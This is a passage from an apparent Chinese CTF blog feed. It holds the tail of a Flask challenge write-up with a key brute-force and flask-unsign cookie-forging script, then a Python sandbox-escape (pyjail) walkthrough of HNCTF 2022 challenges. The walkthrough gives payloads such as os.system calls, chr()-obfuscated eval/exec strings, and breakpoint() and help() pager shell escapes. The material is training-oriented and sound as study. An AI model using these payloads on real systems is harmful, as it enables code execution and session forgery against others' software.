<p>secret()函数<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">key</span>):  </span><br><span class="line">random.seed(key)  </span><br><span class="line"><span class="keyword">return</span> random.randint(<span class="number">8</span>, <span class="number">88888</span>)</span><br></pre></td></tr></table></figure><br>返回一个随机数,key知道了生成的随机数是固定的</p>
<p>对keys里面的key调用secret()函数,丢给solve()函数最后的结过来<code>eval(chr())</code></p>
<p>这里我们的目标是福,想办法让result等于31119,因为ord(‘福’)=31119<br>这里注意solve函数:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">a_value, b_value, c_value, d_value, f_value</span>):</span><br><span class="line">	<span class="comment"># Create the variables</span></span><br><span class="line">	a, b, c, d, e, f = Ints(<span class="string">&#x27;a b c d e f&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Set the relationships between the variables</span></span><br><span class="line">	constraints = [And(<span class="number">8</span> &lt;= v) <span class="keyword">for</span> v <span class="keyword">in</span> [a, b, c, d, e, f]]</span><br><span class="line">	constraints += [a == a_value] </span><br><span class="line">	constraints += [b == b_value]</span><br><span class="line">	constraints += [c == c_value]</span><br><span class="line">	constraints += [d == d_value]</span><br><span class="line">	constraints += [f == f_value]</span><br><span class="line">	constraints += [(a ** <span class="number">3</span>) * (b**<span class="number">2</span> + c**<span class="number">2</span>) * (<span class="number">2</span>*d + <span class="number">1</span>) == (e**<span class="number">3</span>) + (f**<span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Find a satisfying solution</span></span><br><span class="line">	s = Solver()</span><br><span class="line">	s.add(constraints)</span><br><span class="line">	<span class="keyword">if</span> s.check() == sat:</span><br><span class="line">		m = s.model()</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">int</span>(m[e].as_long())</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><br>这个函数返回的e要是31119,abcdf是我们可以传的<br>用这个网站来计算:<br><a href="https://www.wolframalpha.com/input?i=solve+%2841%5E3%29%28b%5E2%2Bc%5E2%29%282d%2B1%29++%3D++%2831119%5E3%29%2B%2888888%5E3%29+over+the+integers+">https://www.wolframalpha.com/input?i=solve+%2841%5E3%29%28b%5E2%2Bc%5E2%29%282d%2B1%29++%3D++%2831119%5E3%29%2B%2888888%5E3%29+over+the+integers+</a><br>五个数据是:41 1728 803 1463 88888</p>
<p>根据value求key<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools,random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">value</span>):</span><br><span class="line">	random.seed(value)</span><br><span class="line">	<span class="keyword">return</span> random.randint(<span class="number">8</span>,<span class="number">88888</span>)</span><br><span class="line">values=[<span class="number">41</span>,<span class="number">1728</span>,<span class="number">803</span>,<span class="number">1463</span>,<span class="number">88888</span>]</span><br><span class="line">keys=[]</span><br><span class="line"><span class="keyword">for</span> combination <span class="keyword">in</span> itertools.product(<span class="string">&#x27;abcdefghigklmnopqrstuvwxyz&#x27;</span>,repeat=<span class="number">4</span>):</span><br><span class="line">	input_value=<span class="string">&#x27;&#x27;</span>.join(combination)</span><br><span class="line">	result=secret(input_value)</span><br><span class="line">	<span class="keyword">if</span> result <span class="keyword">in</span> values:</span><br><span class="line">		keys.append(input_value)</span><br><span class="line">		values.remove(result)</span><br><span class="line">		<span class="built_in">print</span>(result,input_value)</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> values:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">1728</span> aqoi</span><br><span class="line"><span class="number">1463</span> aucl</span><br><span class="line"><span class="number">88888</span> bphi</span><br><span class="line"><span class="number">41</span> cdsn</span><br><span class="line"><span class="number">803</span> ewmu</span><br></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">SECRET_KEY=[<span class="string">&#x27;cdsn&#x27;</span>,<span class="string">&#x27;aqoi&#x27;</span>,<span class="string">&#x27;ewmu&#x27;</span>,<span class="string">&#x27;aucl&#x27;</span>,<span class="string">&#x27;bphi&#x27;</span>]</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node5.anna.nssctf.cn:28315/%E7%A6%8F&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_cookie</span>(<span class="params">secret_key,index=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> index==<span class="built_in">len</span>(SECRET_KEY):</span><br><span class="line">        cmd=subprocess.check_output([<span class="string">&#x27;flask-unsign&#x27;</span>, <span class="string">&#x27;--sign&#x27;</span>, <span class="string">&#x27;--cookie&#x27;</span>, <span class="string">&#x27;&#123;&quot;end&quot;: &quot;&#x27;</span> + secret_key + <span class="string">&#x27;&quot;&#125;&#x27;</span>, <span class="string">&#x27;--secret&#x27;</span>, secret_key])</span><br><span class="line">        <span class="keyword">return</span> cmd.decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session_hash=generate_cookie(SECRET_KEY[index],index+<span class="number">1</span>)</span><br><span class="line">        cmd=subprocess.check_output([<span class="string">&#x27;flask-unsign&#x27;</span>, <span class="string">&#x27;--sign&#x27;</span>, <span class="string">&#x27;--cookie&#x27;</span>, <span class="string">&#x27;&#123;&quot;key&quot;: &quot;&#x27;</span> + SECRET_KEY[index] + <span class="string">&#x27;&quot;,&quot;session&quot;:&quot;&#x27;</span> + session_hash + <span class="string">&#x27;&quot;&#125;&#x27;</span>, <span class="string">&#x27;--secret&#x27;</span>, secret_key])</span><br><span class="line">        <span class="keyword">return</span> cmd.decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookie=&#123;<span class="string">&quot;session&quot;</span>: generate_cookie(SECRET_KEY[<span class="number">0</span>])&#125;</span><br><span class="line">data=&#123;<span class="string">&quot;key&quot;</span>: <span class="string">&#x27;cdsn&#x27;</span>&#125;</span><br><span class="line">res=requests.post(url,cookies=cookie,data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>==对福进行urllib.parse.quote来得到url编码为%E7%A6%8F==</p>
<h3 id="SEETF-2023-ezXXE"><a href="#SEETF-2023-ezXXE" class="headerlink" title="[SEETF 2023]ezXXE"></a>[SEETF 2023]ezXXE</h3><p>下载附件发现是个js题<br>代码审计:</p>
<p>参考:<br><a href="https://blog.l1ao.top/2023/06/12/SEECTFwriteups/">https://blog.l1ao.top/2023/06/12/SEECTFwriteups/</a><br><a href="https://gudiffany.github.io/2023/08/18/13-21-58/#%E7%A6%8F">https://gudiffany.github.io/2023/08/18/13-21-58/#%E7%A6%8F</a><br><a href="https://blog.maple3142.net/2023/06/12/seetf-2023-writeups/#file-uploader-1">https://blog.maple3142.net/2023/06/12/seetf-2023-writeups/#file-uploader-1</a><br><a href="https://github.com/sajjadium/ctf-archives/tree/main/ctfs/SEETF/2023/web">https://github.com/sajjadium/ctf-archives/tree/main/ctfs/SEETF/2023/web</a></p>
]]></content>
      <categories>
        <category>题目复现</category>
      </categories>
      <tags>
        <tag>题目复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Pyjail学习1</title>
    <url>/2024/02/06/PyJail%E5%AD%A6%E4%B9%A01/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前没咋了解过这种题目,前几天强网杯遇到了三个pyjail题,当时搜文章出来全是HNCTF2022的wp和先知社区的总结文章,当时强网也只出了两个,于是打算赛后好好学习一下python沙箱逃逸的内容,感觉内容还挺多的,这篇先把2022的HNCTF题给全刷了(主要看的wp),下一篇在对知识总结</p>
<h2 id="HNCTF2022wp"><a href="#HNCTF2022wp" class="headerlink" title="HNCTF2022wp"></a>HNCTF2022wp</h2><p>这里用的nssctf的平台来做的: <a href="https://www.nssctf.cn/">https://www.nssctf.cn/</a></p>
<h3 id="HNCTF-2022-Week1-calc-jail-beginner-JAIL"><a href="#HNCTF-2022-Week1-calc-jail-beginner-JAIL" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner(JAIL)"></a>[HNCTF 2022 Week1]calc_jail_beginner(JAIL)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Your goal is to read ./flag.txt</span></span><br><span class="line"><span class="comment">#You can use these payload liked `__import__(&#x27;os&#x27;).system(&#x27;cat ./flag.txt&#x27;)` or `print(open(&#x27;/flag.txt&#x27;).read())`</span></span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _     ______      _                              _       _ _ </span></span><br><span class="line"><span class="string"> | |   |  ____|    (_)                            | |     (_) |</span></span><br><span class="line"><span class="string"> | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |</span></span><br><span class="line"><span class="string"> | &#x27;_ \|  __| / _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|  _   | |/ _` | | |</span></span><br><span class="line"><span class="string"> | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |</span></span><br><span class="line"><span class="string"> |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|</span></span><br><span class="line"><span class="string">               __/ |                                           </span></span><br><span class="line"><span class="string">              |___/                                            </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>
<p>无过滤:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">直接用__import__:</span><br><span class="line">__import__(&#x27;os&#x27;).system(&#x27;cat flag&#x27;)</span><br><span class="line">直接读:</span><br><span class="line">open(&#x27;flag&#x27;).read()</span><br><span class="line">print(open(&#x27;flag&#x27;).read())</span><br><span class="line">builtins模块里有__import__: </span><br><span class="line">__builtins__.__import__(&#x27;os&#x27;).system(&#x27;cat flag&#x27;)</span><br></pre></td></tr></table></figure></p>
<h3 id="HNCTF-2022-Week1-calc-jail-beginner-level1-JAIL"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level1-JAIL" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL)</h3><p>考点: ==chr函数拼接绕过==<br>这里加了一个函数<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`ib&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br></pre></td></tr></table></figure><br>过滤了单双引号,反引号和ib两个字母<br>我们可以用<em>chr()</em>函数拼接绕过:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open(&#x27;flag&#x27;).read()</span><br></pre></td></tr></table></figure><br>flag:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chr(0x66)+chr(0x6c)+chr(0x61)+chr(0x67)</span><br></pre></td></tr></table></figure><br>读文件:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open(chr(0x66)+chr(0x6c)+chr(0x61)+chr(0x67)).read()</span><br></pre></td></tr></table></figure><br>执行命令:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec(input())的chr拼接:</span><br><span class="line">chr(0x65)+chr(0x78)+chr(0x65)+chr(0x63)+chr(0x28)+chr(0x69)+chr(0x6e)+chr(0x70)+chr(0x75)+chr(0x74)+chr(0x28)+chr(0x29)+chr(0x29)</span><br><span class="line"></span><br><span class="line">eval(exec(input())):</span><br><span class="line">eval(chr(0x65)+chr(0x78)+chr(0x65)+chr(0x63)+chr(0x28)+chr(0x69)+chr(0x6e)+chr(0x70)+chr(0x75)+chr(0x74)+chr(0x28)+chr(0x29)+chr(0x29))</span><br><span class="line">然后输入:</span><br><span class="line">__import__(&#x27;os&#x27;).system(&#x27;cat flag&#x27;)</span><br><span class="line"></span><br><span class="line">同理可以直接执行__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</span><br><span class="line">eval(chr(0x5f)+ chr(0x5f)+chr(0x69)+chr(0x6d)+chr(0x70)+chr(0x6f)+chr(0x72)+chr(0x74)+chr(0x5f)+chr(0x5f)+chr(0x28)+chr(0x27)+chr(0x6f)+chr(0x73)+chr(0x27)+chr(0x29)+chr(0x2e)+chr(0x73)+chr(0x79)+chr(0x73)+chr(0x74)+chr(0x65)+chr(0x6d)+chr(0x28)+chr(0x27)+chr(0x77)+chr(0x68)+chr(0x6f)+chr(0x61)+chr(0x6d)+chr(0x69)+chr(0x27)+chr(0x29))</span><br></pre></td></tr></table></figure></p>
<h3 id="HNCTF-2022-Week1-calc-jail-beginner-level2-JAIL"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level2-JAIL" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL)</h3><p>考点: ==input()和breakpoint绕过长度限制==<br>这里只限制了一个13位长度<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data)&gt;<span class="number">13</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
<ol>
<li><p>直接把恶意代码带到后面的输入:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec(input())</span><br><span class="line">__import__(&#x27;os&#x27;).system(&#x27;cat flag&#x27;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>breakpoint()断点调试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">breakpoint()</span><br><span class="line">open(&#x27;flag&#x27;).read()</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="HNCTF-2022-Week1-calc-jail-beginner-level2-5-JAIL"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level2-5-JAIL" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL)</h3><p>考点: ==breakpoint函数绕过长度限制==<br>这回在上一关限制13个字符的基础上加了个filter函数<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    BLACKLIST = [<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;input&quot;</span>,<span class="string">&quot;eval&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> BLACKLIST:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i!r&#125;</span> has been banned for security reasons&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
<p>还是可以使用breakpoint()</p>
<h3 id="HNCTF-2022-Week1-calc-jail-beginner-level3-JAIL"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level3-JAIL" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level3(JAIL)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level3(JAIL)</h3><p>考点: ==help函数配合Linux的more/less命令特性来rce==<br>hint:seccon final 2021<br>这关限制了长度小于等于7个,还给了提示,我们breakpoint()肯定用不了了<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ ____  </span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | |___ \ </span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | __) |</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ ||__ &lt; </span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |___) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____/ </span></span><br><span class="line"><span class="string">              __/ |                          _/ |                                     </span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                                       </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"><span class="comment">#the length is be limited less than 7</span></span><br><span class="line"><span class="comment">#it seems banned some payload </span></span><br><span class="line"><span class="comment">#Can u escape it?Good luck!</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data)&gt;<span class="number">7</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure></p>
<p>参考文章: <a href="https://shellcodes.org/Hacking/Python%20eval%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7.html">https://shellcodes.org/Hacking/Python%20eval%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7.html</a><br>python内置的help函数可以执行任意系统命令:</p>
<ol>
<li>输入help()进入help交互式</li>
<li>输入一个任意模块获得改模块的帮助文档,比如sys</li>
<li>Linux中呈现帮助文档是用more或者less命令的,我们可以借助Linux这两个命令的可以执行子shell命令的特性来执行命令</li>
<li>在more或less命令里可以通过输入<code>!</code>或者<code>#!</code>后面接命令执行子shell命令<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">help()</span><br><span class="line">sys</span><br><span class="line">!cat flag</span><br></pre></td></tr></table></figure>
<img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231221172436.png" alt="image.png"><h3 id="HNCTF-2022-Week1-python2-input-JAIL"><a href="#HNCTF-2022-Week1-python2-input-JAIL" class="headerlink" title="[HNCTF 2022 Week1]python2 input(JAIL)"></a>[HNCTF 2022 Week1]python2 input(JAIL)</h3></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">              _   _      ___        ___    _____             _    _ _   </span></span><br><span class="line"><span class="string">             | | | |    / _ \      |__ \  |_   _|           | |  | | |  </span></span><br><span class="line"><span class="string">  _ __  _   _| |_| |__ | | | |_ __    ) |   | |  _ __  _ __ | |  | | |_ </span></span><br><span class="line"><span class="string"> | &#x27;_ \| | | | __| &#x27;_ \| | | | &#x27;_ \  / /    | | | &#x27;_ \| &#x27;_ \| |  | | __|</span></span><br><span class="line"><span class="string"> | |_) | |_| | |_| | | | |_| | | | |/ /_   _| |_| | | | |_) | |__| | |_ </span></span><br><span class="line"><span class="string"> | .__/ \__, |\__|_| |_|\___/|_| |_|____| |_____|_| |_| .__/ \____/ \__|</span></span><br><span class="line"><span class="string"> | |     __/ |                                        | |               </span></span><br><span class="line"><span class="string"> |_|    |___/                                         |_|                               </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> WELCOME</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Welcome to the python jail&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;But this program will repeat your messages&quot;</span></span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span> input_data</span><br></pre></td></tr></table></figure>
<p>直接读:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open(&#x27;flag&#x27;).read()</span><br></pre></td></tr></table></figure></p>
<h3 id="HNCTF-2022-Week1-lake-lake-lake-JAIL"><a href="#HNCTF-2022-Week1-lake-lake-lake-JAIL" class="headerlink" title="[HNCTF 2022 Week1]lake lake lake(JAIL)"></a>[HNCTF 2022 Week1]lake lake lake(JAIL)</h3><p>考点: ==globals()函数获取全局变量==<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#it seems have a backdoor</span></span><br><span class="line"><span class="comment">#can u find the key of it and use the backdoor</span></span><br><span class="line"></span><br><span class="line">fake_key_var_in_the_local_but_real_in_the_remote = <span class="string">&quot;[DELETED]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(code)&gt;<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>)</span><br><span class="line">    key = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(key == fake_key_var_in_the_local_but_real_in_the_remote):</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Nooo!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _       _          _       _          _       _        </span></span><br><span class="line"><span class="string"> | |     | |        | |     | |        | |     | |       </span></span><br><span class="line"><span class="string"> | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ </span></span><br><span class="line"><span class="string"> | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ \</span></span><br><span class="line"><span class="string"> | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/</span></span><br><span class="line"><span class="string"> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Now the program has two functions&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;can you use dockerdoor&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1.func&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;2.backdoor&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(input_data == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">    func()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">elif</span>(input_data == <span class="string">&quot;2&quot;</span>):</span><br><span class="line">    backdoor()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not found the choice&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
<p>有两个功能都能执行eval函数,第一个限制9个长度,第二个只要key对了没有任何限制<br>可以获取全局变量globals<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(eval(&quot;globals()&quot;))</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231221182310.png" alt="image.png"></p>
<h3 id="HNCTF-2022-Week1-l-ke-l-ke-l-ke-JAIL"><a href="#HNCTF-2022-Week1-l-ke-l-ke-l-ke-JAIL" class="headerlink" title="[HNCTF 2022 Week1]l@ke l@ke l@ke(JAIL)"></a>[HNCTF 2022 Week1]l@ke l@ke l@ke(JAIL)</h3><p>考点: ==help()函数的server查看全局变量==<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#it seems have a backdoor as `lake lake lake`</span></span><br><span class="line"><span class="comment">#but it seems be limited!</span></span><br><span class="line"><span class="comment">#can u find the key of it and use the backdoor</span></span><br><span class="line"></span><br><span class="line">fake_key_var_in_the_local_but_real_in_the_remote = <span class="string">&quot;[DELETED]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(code)&gt;<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>)</span><br><span class="line">    key = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(key == fake_key_var_in_the_local_but_real_in_the_remote):</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Nooo!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _         _          _         _          _         _        </span></span><br><span class="line"><span class="string"> | |  ____ | |        | |  ____ | |        | |  ____ | |       </span></span><br><span class="line"><span class="string"> | | / __ \| | _____  | | / __ \| | _____  | | / __ \| | _____ </span></span><br><span class="line"><span class="string"> | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \</span></span><br><span class="line"><span class="string"> | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/</span></span><br><span class="line"><span class="string"> |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___|</span></span><br><span class="line"><span class="string">     \____/               \____/               \____/                                                                                                                                                                                                                                        </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Now the program has two functions&quot;</span>)</span><br><span class="line"><span 